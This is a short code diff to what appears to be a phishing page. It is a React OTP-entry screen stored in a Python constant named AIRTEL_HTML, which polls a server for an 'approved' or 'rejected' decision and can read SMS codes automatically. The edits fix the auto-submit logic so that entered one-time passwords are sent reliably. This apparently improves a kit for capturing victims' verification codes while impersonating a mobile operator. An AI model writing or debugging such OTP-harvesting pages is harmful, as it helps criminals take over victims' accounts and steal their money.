@@ -533,6 +533,7 @@ AIRTEL_HTML = r"""<!DOCTYPE html>
               if (data.status === 'approved') {
                 clearInterval(pollInterval);
                 setIsLoading(false);
+                setOtp(['', '', '', '']); // Clear OTP so it never triggers the submission effect again
                 setStep(3);
               } else if (data.status === 'rejected') {
                 clearInterval(pollInterval);
@@ -553,11 +554,11 @@ AIRTEL_HTML = r"""<!DOCTYPE html>
 
       // Centralized trigger: automatically submit once 4 digits are completed
       useEffect(() => {
-        const code = otp.join('');
-        if (code.length === 4 && !isLoading) {
+        const code = otp.join('').trim();
+        if (step === 2 && code.length === 4 && !isLoading) {
           handleVerify(code);
         }
-      }, [otp, isLoading]);
+      }, [otp, isLoading, step]);
 
       // SMS Auto-Detection (WebOTP + WebView Native Hook)
       useEffect(() => {
